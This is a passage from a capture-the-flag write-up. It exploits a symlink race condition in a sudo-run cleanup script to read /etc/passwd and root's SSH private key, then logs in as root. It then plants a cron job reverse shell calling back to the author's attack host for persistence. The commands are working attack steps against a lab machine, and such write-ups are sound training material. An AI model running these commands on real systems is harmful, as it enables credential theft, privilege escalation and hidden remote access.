change the symlink target to point to sensitive files. The script will then read that new target\u0026rsquo;s content, bypassing the initial check.\nExploiting The TOCTOU Vulnerability POC To exploit this, we need two terminal sessions connected to the host. +Note+: I already checked if tmux was available and it wasn\u0026rsquo;t :( so we need to have two ssh sessions instead.\nCreate a throw-away symlink to bypass the initial target check. Make sure the symlink target is not inside /etc or /root.\nln -s fake POC.png In the second terminal, we create a continuous loop that repeatedly overwrites the quarantined symlink to point to a sensitive we want to read:\nwhile true; do ln -sf /etc/passwd /var/quarantined/POC.png; done +Note+:\nThe while true loop runs indefinitely, constantly overwriting the symlink. The -f flag forces the symlink overwrite to avoid errors. Back in the first terminal, we set the environment variable CHECK_CONTENT=true and run the script:\nexport CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh ./POC.png +Note+:\nThe script only prints file contents if CHECK_CONTENT is true. The race condition occurs as the script moves the link, and the infinite loop overwrites the quarantined symlink target to the sensitive file. Success!!! So we can now read root \u0026amp; etc files using this process.\nExploiting The TOCTOU Vulnerability To Get The Root SSH Key As we have now confirmed the vulnerability, we can target the root SSH private key.\nCreate a throw-away symlink again: ln -s fake key.png In the second terminal, loop to overwrite the quarantine symlink pointing to root\u0026rsquo;s private key: while true; do ln -sf /root/.ssh/id_rsa /var/quarantined/key.png; done In the first terminal, set the env variable and run the script: export CHECK_CONTENT=true; sudo /usr/bin/bash /opt/ghost/clean_symlink.sh ./key.png Success! We can see the root SSH private key dumped.\nSave the key locally and secure its permissions:\nsudo chmod 600 root_key Connect to the host as root using the stolen key:\nssh -i root_key root@10.129.151.29 Let\u0026rsquo;s get our flag:\n4. Persistence: It\u0026rsquo;s time to setup persistence. I know we have a root ssh key but where is the fun in that.\nCreating a cron job reverse shell: Lets setup a cron job that will call out to our attack host every 1 minute with a simple tcp shell.\n(crontab -l \u0026gt; .tab ; echo \u0026#34;* * * * * /bin/bash -c \u0026#39;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.220/80 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; \u0026gt;\u0026gt; .tab ; crontab .tab ; rm .tab) \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 Let\u0026rsquo;s verify it\u0026rsquo;s in the crontab by running crontab -l\nAs we can see it\u0026rsquo;s running.\nI start my listener and get a connection back after 1 minute.\n+Note+: This is great as a means to call back out to our attack machine, however an interval of every 1 minute is excessive, it would typically be better to set it at longer intervals to re-connect.\nLessons Learned: What did I learn? It was fun to learn about git repo vulnerabilities more and use them as an attack vector. It was also great to get my head around the way to solve the race condition, took some fiddling but we got there. What silly mistakes did I make? Not a huge amount this time which is nice, just took my time and got on with it. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at bloodstiller dot com\n",
